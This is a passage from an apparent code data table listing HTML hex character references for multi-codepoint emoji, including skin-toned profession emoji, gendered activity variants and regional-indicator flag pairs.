'&#x1f468;&#x1f3ff;&#x200d;&#x1f9bd;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f33e;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f373;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f37c;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f384;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f393;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f3a4;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f3a8;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f3eb;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f3ed;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f4bb;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f4bc;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f527;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f52c;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f680;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f692;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9af;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9b0;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9b1;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9b2;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9b3;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9bc;', '&#x1f469;&#x1f3fb;&#x200d;&#x1f9bd;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f33e;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f373;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f37c;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f384;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f393;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f3a4;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f3a8;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f3eb;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f3ed;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f4bb;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f4bc;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f527;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f52c;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f680;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f692;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9af;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9b0;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9b1;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9b2;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9b3;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9bc;', '&#x1f469;&#x1f3fc;&#x200d;&#x1f9bd;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f33e;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f373;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f37c;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f384;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f393;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f3a4;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f3a8;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f3eb;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f3ed;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f4bb;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f4bc;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f527;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f52c;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f680;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f692;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9af;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9b0;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9b1;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9b2;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9b3;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9bc;', '&#x1f469;&#x1f3fd;&#x200d;&#x1f9bd;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f33e;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f373;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f37c;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f384;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f393;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f3a4;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f3a8;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f3eb;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f3ed;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f4bb;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f4bc;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f527;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f52c;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f680;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f692;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9af;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9b0;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9b1;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9b2;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9b3;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9bc;', '&#x1f469;&#x1f3fe;&#x200d;&#x1f9bd;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f33e;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f373;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f37c;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f384;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f393;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f3a4;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f3a8;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f3eb;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f3ed;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f4bb;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f4bc;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f527;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f52c;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f680;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f692;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9af;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9b0;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9b1;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9b2;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9b3;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9bc;', '&#x1f469;&#x1f3ff;&#x200d;&#x1f9bd;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f33e;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f373;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f37c;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f384;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f393;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f527;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f52c;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f680;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f692;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9af;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x1f3fb;&#x200d;&#x1f9bd;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f33e;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f373;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f37c;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f384;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f393;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f527;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f52c;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f680;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f692;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9af;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x1f3fc;&#x200d;&#x1f9bd;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f33e;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f373;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f37c;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f384;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f393;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f527;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f52c;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f680;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f692;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9af;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x1f3fd;&#x200d;&#x1f9bd;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f33e;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f373;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f37c;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f384;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f393;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f527;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f52c;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f680;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f692;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9af;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x1f3fe;&#x200d;&#x1f9bd;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f33e;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f373;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f37c;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f384;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f393;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f527;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f52c;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f680;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f692;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9af;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x1f3ff;&#x200d;&#x1f9bd;', '&#x1f3f3;&#xfe0f;&#x200d;&#x1f308;', '&#x1f636;&#x200d;&#x1f32b;&#xfe0f;', '&#x1f3c3;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c3;&#x200d;&#x2642;&#xfe0f;', '&#x1f3c4;&#x200d;&#x2640;&#xfe0f;', '&#x1f3c4;&#x200d;&#x2642;&#xfe0f;', '&#x1f3ca;&#x200d;&#x2640;&#xfe0f;', '&#x1f3ca;&#x200d;&#x2642;&#xfe0f;', '&#x1f3f4;&#x200d;&#x2620;&#xfe0f;', '&#x1f43b;&#x200d;&#x2744;&#xfe0f;', '&#x1f468;&#x200d;&#x2695;&#xfe0f;', '&#x1f468;&#x200d;&#x2696;&#xfe0f;', '&#x1f468;&#x200d;&#x2708;&#xfe0f;', '&#x1f469;&#x200d;&#x2695;&#xfe0f;', '&#x1f469;&#x200d;&#x2696;&#xfe0f;', '&#x1f469;&#x200d;&#x2708;&#xfe0f;', '&#x1f46e;&#x200d;&#x2640;&#xfe0f;', '&#x1f46e;&#x200d;&#x2642;&#xfe0f;', '&#x1f46f;&#x200d;&#x2640;&#xfe0f;', '&#x1f46f;&#x200d;&#x2642;&#xfe0f;', '&#x1f470;&#x200d;&#x2640;&#xfe0f;', '&#x1f470;&#x200d;&#x2642;&#xfe0f;', '&#x1f471;&#x200d;&#x2640;&#xfe0f;', '&#x1f471;&#x200d;&#x2642;&#xfe0f;', '&#x1f473;&#x200d;&#x2640;&#xfe0f;', '&#x1f473;&#x200d;&#x2642;&#xfe0f;', '&#x1f477;&#x200d;&#x2640;&#xfe0f;', '&#x1f477;&#x200d;&#x2642;&#xfe0f;', '&#x1f481;&#x200d;&#x2640;&#xfe0f;', '&#x1f481;&#x200d;&#x2642;&#xfe0f;', '&#x1f482;&#x200d;&#x2640;&#xfe0f;', '&#x1f482;&#x200d;&#x2642;&#xfe0f;', '&#x1f486;&#x200d;&#x2640;&#xfe0f;', '&#x1f486;&#x200d;&#x2642;&#xfe0f;', '&#x1f487;&#x200d;&#x2640;&#xfe0f;', '&#x1f487;&#x200d;&#x2642;&#xfe0f;', '&#x1f645;&#x200d;&#x2640;&#xfe0f;', '&#x1f645;&#x200d;&#x2642;&#xfe0f;', '&#x1f646;&#x200d;&#x2640;&#xfe0f;', '&#x1f646;&#x200d;&#x2642;&#xfe0f;', '&#x1f647;&#x200d;&#x2640;&#xfe0f;', '&#x1f647;&#x200d;&#x2642;&#xfe0f;', '&#x1f64b;&#x200d;&#x2640;&#xfe0f;', '&#x1f64b;&#x200d;&#x2642;&#xfe0f;', '&#x1f64d;&#x200d;&#x2640;&#xfe0f;', '&#x1f64d;&#x200d;&#x2642;&#xfe0f;', '&#x1f64e;&#x200d;&#x2640;&#xfe0f;', '&#x1f64e;&#x200d;&#x2642;&#xfe0f;', '&#x1f6a3;&#x200d;&#x2640;&#xfe0f;', '&#x1f6a3;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b4;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b4;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b5;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b5;&#x200d;&#x2642;&#xfe0f;', '&#x1f6b6;&#x200d;&#x2640;&#xfe0f;', '&#x1f6b6;&#x200d;&#x2642;&#xfe0f;', '&#x1f926;&#x200d;&#x2640;&#xfe0f;', '&#x1f926;&#x200d;&#x2642;&#xfe0f;', '&#x1f935;&#x200d;&#x2640;&#xfe0f;', '&#x1f935;&#x200d;&#x2642;&#xfe0f;', '&#x1f937;&#x200d;&#x2640;&#xfe0f;', '&#x1f937;&#x200d;&#x2642;&#xfe0f;', '&#x1f938;&#x200d;&#x2640;&#xfe0f;', '&#x1f938;&#x200d;&#x2642;&#xfe0f;', '&#x1f939;&#x200d;&#x2640;&#xfe0f;', '&#x1f939;&#x200d;&#x2642;&#xfe0f;', '&#x1f93c;&#x200d;&#x2640;&#xfe0f;', '&#x1f93c;&#x200d;&#x2642;&#xfe0f;', '&#x1f93d;&#x200d;&#x2640;&#xfe0f;', '&#x1f93d;&#x200d;&#x2642;&#xfe0f;', '&#x1f93e;&#x200d;&#x2640;&#xfe0f;', '&#x1f93e;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b8;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b8;&#x200d;&#x2642;&#xfe0f;', '&#x1f9b9;&#x200d;&#x2640;&#xfe0f;', '&#x1f9b9;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9ce;&#x200d;&#x2640;&#xfe0f;', '&#x1f9ce;&#x200d;&#x2642;&#xfe0f;', '&#x1f9cf;&#x200d;&#x2640;&#xfe0f;', '&#x1f9cf;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d1;&#x200d;&#x2695;&#xfe0f;', '&#x1f9d1;&#x200d;&#x2696;&#xfe0f;', '&#x1f9d1;&#x200d;&#x2708;&#xfe0f;', '&#x1f9d4;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d4;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d6;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d6;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d7;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d7;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d8;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d8;&#x200d;&#x2642;&#xfe0f;', '&#x1f9d9;&#x200d;&#x2640;&#xfe0f;', '&#x1f9d9;&#x200d;&#x2642;&#xfe0f;', '&#x1f9da;&#x200d;&#x2640;&#xfe0f;', '&#x1f9da;&#x200d;&#x2642;&#xfe0f;', '&#x1f9db;&#x200d;&#x2640;&#xfe0f;', '&#x1f9db;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dc;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dc;&#x200d;&#x2642;&#xfe0f;', '&#x1f9dd;&#x200d;&#x2640;&#xfe0f;', '&#x1f9dd;&#x200d;&#x2642;&#xfe0f;', '&#x1f9de;&#x200d;&#x2640;&#xfe0f;', '&#x1f9de;&#x200d;&#x2642;&#xfe0f;', '&#x1f9df;&#x200d;&#x2640;&#xfe0f;', '&#x1f9df;&#x200d;&#x2642;&#xfe0f;', '&#x2764;&#xfe0f;&#x200d;&#x1f525;', '&#x2764;&#xfe0f;&#x200d;&#x1fa79;', '&#x1f415;&#x200d;&#x1f9ba;', '&#x1f441;&#x200d;&#x1f5e8;', '&#x1f468;&#x200d;&#x1f33e;', '&#x1f468;&#x200d;&#x1f373;', '&#x1f468;&#x200d;&#x1f37c;', '&#x1f468;&#x200d;&#x1f384;', '&#x1f468;&#x200d;&#x1f393;', '&#x1f468;&#x200d;&#x1f3a4;', '&#x1f468;&#x200d;&#x1f3a8;', '&#x1f468;&#x200d;&#x1f3eb;', '&#x1f468;&#x200d;&#x1f3ed;', '&#x1f468;&#x200d;&#x1f466;', '&#x1f468;&#x200d;&#x1f467;', '&#x1f468;&#x200d;&#x1f4bb;', '&#x1f468;&#x200d;&#x1f4bc;', '&#x1f468;&#x200d;&#x1f527;', '&#x1f468;&#x200d;&#x1f52c;', '&#x1f468;&#x200d;&#x1f680;', '&#x1f468;&#x200d;&#x1f692;', '&#x1f468;&#x200d;&#x1f9af;', '&#x1f468;&#x200d;&#x1f9b0;', '&#x1f468;&#x200d;&#x1f9b1;', '&#x1f468;&#x200d;&#x1f9b2;', '&#x1f468;&#x200d;&#x1f9b3;', '&#x1f468;&#x200d;&#x1f9bc;', '&#x1f468;&#x200d;&#x1f9bd;', '&#x1f469;&#x200d;&#x1f33e;', '&#x1f469;&#x200d;&#x1f373;', '&#x1f469;&#x200d;&#x1f37c;', '&#x1f469;&#x200d;&#x1f384;', '&#x1f469;&#x200d;&#x1f393;', '&#x1f469;&#x200d;&#x1f3a4;', '&#x1f469;&#x200d;&#x1f3a8;', '&#x1f469;&#x200d;&#x1f3eb;', '&#x1f469;&#x200d;&#x1f3ed;', '&#x1f469;&#x200d;&#x1f466;', '&#x1f469;&#x200d;&#x1f467;', '&#x1f469;&#x200d;&#x1f4bb;', '&#x1f469;&#x200d;&#x1f4bc;', '&#x1f469;&#x200d;&#x1f527;', '&#x1f469;&#x200d;&#x1f52c;', '&#x1f469;&#x200d;&#x1f680;', '&#x1f469;&#x200d;&#x1f692;', '&#x1f469;&#x200d;&#x1f9af;', '&#x1f469;&#x200d;&#x1f9b0;', '&#x1f469;&#x200d;&#x1f9b1;', '&#x1f469;&#x200d;&#x1f9b2;', '&#x1f469;&#x200d;&#x1f9b3;', '&#x1f469;&#x200d;&#x1f9bc;', '&#x1f469;&#x200d;&#x1f9bd;', '&#x1f62e;&#x200d;&#x1f4a8;', '&#x1f635;&#x200d;&#x1f4ab;', '&#x1f9d1;&#x200d;&#x1f33e;', '&#x1f9d1;&#x200d;&#x1f373;', '&#x1f9d1;&#x200d;&#x1f37c;', '&#x1f9d1;&#x200d;&#x1f384;', '&#x1f9d1;&#x200d;&#x1f393;', '&#x1f9d1;&#x200d;&#x1f3a4;', '&#x1f9d1;&#x200d;&#x1f3a8;', '&#x1f9d1;&#x200d;&#x1f3eb;', '&#x1f9d1;&#x200d;&#x1f3ed;', '&#x1f9d1;&#x200d;&#x1f4bb;', '&#x1f9d1;&#x200d;&#x1f4bc;', '&#x1f9d1;&#x200d;&#x1f527;', '&#x1f9d1;&#x200d;&#x1f52c;', '&#x1f9d1;&#x200d;&#x1f680;', '&#x1f9d1;&#x200d;&#x1f692;', '&#x1f9d1;&#x200d;&#x1f9af;', '&#x1f9d1;&#x200d;&#x1f9b0;', '&#x1f9d1;&#x200d;&#x1f9b1;', '&#x1f9d1;&#x200d;&#x1f9b2;', '&#x1f9d1;&#x200d;&#x1f9b3;', '&#x1f9d1;&#x200d;&#x1f9bc;', '&#x1f9d1;&#x200d;&#x1f9bd;', '&#x1f408;&#x200d;&#x2b1b;', '&#x1f426;&#x200d;&#x2b1b;', '&#x1f1e6;&#x1f1e8;', '&#x1f1e6;&#x1f1e9;', '&#x1f1e6;&#x1f1ea;', '&#x1f1e6;&#x1f1eb;', '&#x1f1e6;&#x1f1ec;', '&#x1f1e6;&#x1f1ee;', '&#x1f1e6;&#x1f1f1;', '&#x1f1e6;&#x1f1f2;', '&#x1f1e6;&#x1f1f4;', '&#x1f1e6;&#x1f1f6;', '&#x1f1e6;&#x1f1f7;', '&#x1f1e6;&#x1f1f8;', '&#x1f1e6;&#x1f1f9;', '&#x1f1e6;&#x1f1fa;', '&#x1f1e6;&#x1f1fc;', '&#x1f1e6;&#x1f1fd;', '&#x1f1e6;&#x1f1ff;', '&#x1f1e7;&#x1f1e6;', '&#x1f1e7;&#x1f1e7;', '&#x1f1e7;&#x1f1e9;', '&#x1f1e7;&#x1f1ea;', '&#x1f1e7;&#x1f1eb;', '&#x1f1e7;&#x1f1ec;', '&#x1f1e7;&#x1f1ed;', '&#x1f1e7;&#x1f1ee;', '&#x1f1e7;&#x1f1ef;', '&#x1f1e7;&#x1f1f1;', '&#x1f1e7;&#x1f1f2;', '&#x1f1e7;&#x1f1f3;', '&#x1f1e7;&#x1f1f4;', '&#x1f1e7;&#x1f1f6;', '&#x1f1e7;&#x1f1f7;', '&#x1f1e7;&#x1f1f8;', '&#x1f1e7;&#x1f1f9;', '&#x1f1e7;&#x1f1fb;', '&#x1f1e7;&#x1f1fc;', '&#x1f1e7;&#x1f1fe;', '&#x1f1e7;&#x1f1ff;', '&#x1f1e8;&#x1f1e6;', '&#x1f1e8;&#x1f1e8;', '&#x1f1e8;&#x1f1e9;', '&#x1f1e8;&#x1f1eb;', '&#x1f1e8;&#x1f1ec;', '&#x1f1e8;&#x1f1ed;', '&#x1f1e8;&#x1f1ee;', '&#x1f1e8;&#x1f1f0;', '&#x1f1e8;&#x1f1f1;', '&#x1f1e8;&#x1f1f2;', '&#x1f1e8;&#x1f1f3;', '&#x1f1e8;&#x1f1f4;', '&#x1f1e8;&#x1f1f5;', '&#x1f1e8;&#x1f1f7;', '&#x1f1e8;&#x1f1fa;', '&#x1f1e8;&#x1f1fb;', '&#x1f1e8;&#x1f1fc;', '&#x1f1e8;&#x1f1fd;', '&#x1f1e8;&#x1f1fe;', '&#x1f1e8;&#x1f1ff;', '&#x1f1e9;&#x1f1ea;', '&#x1f1e9;&#x1f1ec;', '&#x1f1e9;&#x1f1ef;', '&#x1f1e9;&#x1f1f0;', '&#x1f1e9;&#x1f1f2;', '&#x1f1e9;&#x1f1f4;', '&#x1f1e9;&#x1f1ff;', '&#x1f1ea;&#x1f1e6;', '&#x1f1ea;&#x1f1e8;', '&#x1f1ea;&#x1f1ea;', '&#x1f1ea;&#x1f1ec;', '&#x1f1ea;&#x1f1ed;', '&#x1f1ea;&#x1f1f7;', '&#x1f1ea;&#x1f1f8;', '&#x1f1ea;&#x1f1f9;', '&#x1f1ea;&#x1f1fa;', '&#x1f1eb;&#x1f1ee;', '&#x1f1eb;&#x1f1ef;', '&#x1f1eb;&#x1f1f0;', '&#x1f1eb;&#x1f1f2;', '&#x1f1eb;&#x1f1f4;', '&#x1f1eb;&#x1f1f7;', '&#x1f1ec;&#x1f1e6;', '&#x1f1ec;&#x1f1e7;', '&#x1f1ec;&#x1f1e9;', '&#x1f1ec;&#x1f1ea;', '&#x1f1ec;&#x1f1eb;', '&#x1f1ec;&#x1f1ec;', '&#x1f1ec;&#x1f1ed;', '&#x1f1ec;&#x1f1ee;', '&#x1f1ec;&#x1f1f1;', '&#x1f1ec;&#x1f1f2;', '&#x1f1ec;&#x1f1f3;', '&#x1f1ec;&#x1f1f5;', '&#x1f1ec;&#x1f1f6;', '&#x1f1ec;&#x1f1f7;', '&#x1f1ec;&#x1f1f8;', '&#x1f1ec;&#x1f1f9;', '&#x1f1ec;&#x1f1fa;', '&#x1f1ec;&#x1f1fc;', '&#x1f1ec;&#x1f1fe;', '&#x1f1ed;&#x1f1f0;', '&#x1f1ed;&#x1f1f2;', '&#x1f1ed;&#x1f1f3;', '&#x1f1ed;&#x1f1f7;', '&#x1f1ed;&#x1f1f9;', '&#x1f1ed;&#x1f1fa;', '&#x1f1ee;&#x1f1e8;', '&#x1f1ee;&#x1f1e9;', '&#x1f1ee;&#x1f1ea;', '&#x1f1ee;&#x1f1f1;', '&#x1f1ee;&#x1f1f2;', '&#x1f1ee;&#x1f1f3;', '&#x1f1ee;&#x1f1f4;', '&#x1f1ee;&#x1f1f6;', '&#x1f1ee;&#x1f1f7;', '&#x1f1ee;&#x1f1f8;', '&#x1f1ee;&#x1f1f9;', '&#x1f1ef;&#x1f1ea;', '&#x1f1ef;&#x1f1f2;', '&#x1f1ef;&#x1f1f4;', '&#x1f1ef;&#x1f1f5;', '&#x1f1f0;&#x1f1ea;', '&#x1f1f0;&#x1f1ec;', '&#x1f1f0;&#x1f1ed;', '&#x1f1f0;&#x1f1ee;', '&#x1f1f0;&#x1f1f2;', '&#x1f1f0;&#x1f1f3;', '&#x1f1f0;&#x1f1f5;', 